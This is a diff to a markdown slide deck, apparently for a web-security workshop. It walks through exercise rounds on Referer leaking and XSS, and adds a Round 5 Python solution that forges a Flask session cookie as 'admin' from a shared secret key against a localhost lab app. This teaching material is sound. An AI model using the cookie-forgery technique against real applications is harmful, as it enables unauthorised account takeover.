@@ -28,6 +28,7 @@ Install:
 ```bash
 pip install Flask
 pip install python-memcached
+pip install requests
 ```
 
 
@@ -101,7 +102,7 @@ Goal: **Access the review page**
 
 
 ## Round 3
-Referer leaking and (almost) session fixation
+Referer leaking
 
 upload an app format:
 
@@ -128,9 +129,16 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0', port=9999)
 ```
 
-At:
 
-```http://localhost:9999```
+
+## Round 3
+HTTPS > HTTP *No referrer*
+
+HTTPS > HTTPS *Referrer shown*
+
+https://bugzilla.mozilla.org/show_bug.cgi?id=704320
+
+http://smerity.com/articles/2013/where_did_all_the_http_referrers_go.html
 
 
 
@@ -151,13 +159,37 @@ XSS
 }&lt;/script>"}
 ```
 
-* Note: < should not be escaped, but markdown > reveal.js hates me.
+* Note: < should not be escaped, but markdown to reveal.js hates me.
 
 
 
 ## Round 5
-To come
+This is really similar to round 1, except without the SQL Injection.
 
+Goal: **Get logged in**
+
+
+
+## Round 5
+Fake cookie
+
+```python
+import hashlib
+
+import requests
+from flask.sessions import TaggedJSONSerializer
+from itsdangerous import URLSafeTimedSerializer
+
+url = URLSafeTimedSerializer('is-it-really-bad-if-this-is-shared',
+                             salt='cookie-session',
+                             serializer=TaggedJSONSerializer(),
+                             signer_kwargs={'key_derivation': 'hmac',
+                                            'digest_method': hashlib.sha1})
+
+cookie = url.dumps({'user': 'admin'})
+res = requests.get('http://localhost:5000', cookies={'session': cookie })
+assert 'So logged in' in res.text
+```
 
 
 
@@ -187,7 +219,7 @@ A very small portion of security bugs use this clasification, we should do that 
 - wsec-cookie: 1
 - wsec-crossdomain: 1
 - wsec-crypto: 1
-- *wsec-csrf: 11*
+- **wsec-csrf: 11**
 - wsec-disclosure: 2
 - wsec-dos: 1
 - wsec-errorhandling: 1
@@ -198,4 +230,4 @@ A very small portion of security bugs use this clasification, we should do that 
 - wsec-other: 6
 - wsec-session: 1
 - wsec-sqli: 0
-- *wsec-xss: 33*
+- **wsec-xss: 33**
